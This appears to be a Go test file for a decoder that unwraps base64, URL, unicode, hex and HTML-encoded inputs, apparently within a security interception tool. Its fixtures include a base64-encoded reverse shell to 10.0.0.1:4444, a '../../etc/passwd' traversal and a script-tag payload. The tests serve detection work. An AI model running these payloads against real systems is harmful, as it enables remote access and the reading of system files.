package intercept

import (
	"strings"
	"testing"
)

func viewsByKind(vs []DecodedView, kind string) []DecodedView {
	var out []DecodedView
	for _, v := range vs {
		if v.Kind == kind {
			out = append(out, v)
		}
	}
	return out
}

func TestDecodeBase64Payload(t *testing.T) {
	// "bash -i" base64-encoded, the classic obfuscated reverse shell fragment.
	enc := "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE="
	vs := DecodePayload(enc)
	b := viewsByKind(vs, "base64")
	if len(b) == 0 {
		t.Fatalf("base64 payload not decoded: %+v", vs)
	}
	if !strings.Contains(b[0].Text, "bash -i") {
		t.Fatalf("decoded text = %q, want the shell command", b[0].Text)
	}
}

func TestDecodeURLEncodedPayload(t *testing.T) {
	vs := DecodePayload("%2e%2e%2f%2e%2e%2fetc%2fpasswd")
	u := viewsByKind(vs, "url")
	if len(u) == 0 {
		t.Fatalf("percent-encoded traversal not decoded: %+v", vs)
	}
	if u[0].Text != "../../etc/passwd" {
		t.Fatalf("decoded = %q", u[0].Text)
	}
}

func TestDecodeUnicodeEscape(t *testing.T) {
	vs := DecodePayload(`\u0062\u0061\u0073\u0068\u0020\u002d\u0069`)
	u := viewsByKind(vs, "unicode")
	if len(u) == 0 || u[0].Text != "bash -i" {
		t.Fatalf("unicode escapes not decoded: %+v", vs)
	}
}

func TestDecodeHexPayload(t *testing.T) {
	vs := DecodePayload("77686f616d69") // "whoami"
	h := viewsByKind(vs, "hex")
	if len(h) == 0 || h[0].Text != "whoami" {
		t.Fatalf("hex payload not decoded: %+v", vs)
	}
}

func TestDecodeHTMLNamedEntities(t *testing.T) {
	vs := DecodePayload("&lt;script&gt;alert(1)&lt;/script&gt;")
	h := viewsByKind(vs, "html")
	if len(h) == 0 || !strings.Contains(h[0].Text, "<script>") {
		t.Fatalf("html entities not decoded: %+v", vs)
	}
}

func TestDecodeNestedEncodingReachesDepthTwo(t *testing.T) {
	// A base64 string that decodes to a percent-encoded traversal.
	inner := urlEncodeForTest("../../etc/passwd")
	outer := base64ForTest(inner)
	vs := DecodePayload(outer)
	found := false
	for _, v := range vs {
		if v.Depth == 2 && strings.Contains(v.Text, "/etc/passwd") {
			found = true
		}
	}
	if !found {
		t.Fatalf("nested encoding not resolved to depth 2: %+v", vs)
	}
}

func TestDecodeLeavesPlainTextAlone(t *testing.T) {
	for _, s := range []string{"GET /api/v1/orders?id=42", "nmap -sV 10.0.0.1", "select * from users"} {
		if vs := DecodePayload(s); len(vs) != 0 {
			t.Fatalf("plain text %q produced views: %+v", s, vs)
		}
	}
}

func TestDecodeSkipsShortAndHugeInputs(t *testing.T) {
	if vs := DecodePayload("YWJj"); len(vs) != 0 {
		t.Fatalf("short input should be ignored: %+v", vs)
	}
	huge := strings.Repeat("A", decodeMaxLen+1)
	if vs := DecodePayload(huge); len(vs) != 0 {
		t.Fatalf("oversized input should be ignored")
	}
}

func TestDecodeRejectsBinaryNoise(t *testing.T) {
	// Random bytes grow non-printable characters; treating them as a decoded
	// payload would hand the judge garbage to reason about.
	noise := base64ForTest(string([]byte{0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07}))
	for _, v := range DecodePayload(noise) {
		if v.Kind == "base64" && !printable(v.Text) {
			t.Fatalf("binary decode surfaced: %q", v.Text)
		}
	}
}

func urlEncodeForTest(s string) string {
	var b strings.Builder
	for _, c := range []byte(s) {
		b.WriteString("%")
		b.WriteString(strings.ToUpper(hex2(c)))
	}
	return b.String()
}

func hex2(b byte) string {
	const digits = "0123456789abcdef"
	return string([]byte{digits[b>>4], digits[b&0x0f]})
}

func base64ForTest(s string) string {
	const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	var b strings.Builder
	data := []byte(s)
	for i := 0; i < len(data); i += 3 {
		var n uint32
		rem := len(data) - i
		n = uint32(data[i]) << 16
		if rem > 1 {
			n |= uint32(data[i+1]) << 8
		}
		if rem > 2 {
			n |= uint32(data[i+2])
		}
		b.WriteByte(alphabet[(n>>18)&0x3f])
		b.WriteByte(alphabet[(n>>12)&0x3f])
		if rem > 1 {
			b.WriteByte(alphabet[(n>>6)&0x3f])
		} else {
			b.WriteByte('=')
		}
		if rem > 2 {
			b.WriteByte(alphabet[n&0x3f])
		} else {
			b.WriteByte('=')
		}
	}
	return b.String()
}
